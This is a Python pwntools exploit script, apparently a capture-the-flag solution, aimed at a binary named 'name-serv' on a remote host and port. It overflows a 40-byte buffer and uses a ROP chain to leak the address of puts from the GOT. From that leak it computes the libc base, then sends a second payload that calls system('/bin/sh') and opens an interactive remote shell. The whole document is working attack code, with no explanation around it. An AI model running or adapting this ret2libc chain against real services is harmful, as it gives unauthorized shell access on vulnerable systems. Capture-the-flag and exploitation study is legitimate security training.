from pwn import *

elf = ELF('name-serv')
context.update(arch='amd64', os='linux', binary=elf)

host = '3.97.113.25'
port = 9001

if args.LOCAL:
	p = elf.process()
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote(host, port)
	libc = ELF('libc6_2.31-0ubuntu9.1_amd64.so')

offset = 40
pop_rdi = 0x4006d3
ret = 0x4004c6

func = 'puts'
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got[func])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendlineafter(b'name: ', payload)
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
log.info(f'Leaked {func} = {hex(leak)}')
libc.address = leak - libc.symbols[func]

binsh = next(libc.search(b'/bin/sh'))
payload = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols['system'])

input('Proceed? ')
p.sendlineafter(b'name: ', payload)

# funcs = []
# for func in elf.got:
# 	if len(payload) + 24 >= 500:
# 		break
# 	payload += p64(pop_rdi)
# 	payload += p64(elf.got[func])
# 	payload += p64(elf.plt['puts'])
# 	funcs.append(func)

# p.recvuntil(b'name: ')
# p.sendline(payload)

# for i, leak in enumerate(p.recvlines(len(funcs))):
# 	leak = u64(leak.ljust(8, b'\x00'))
# 	log.info(f'Leaked {funcs[i]} = {hex(leak)}')

p.interactive()
p.close()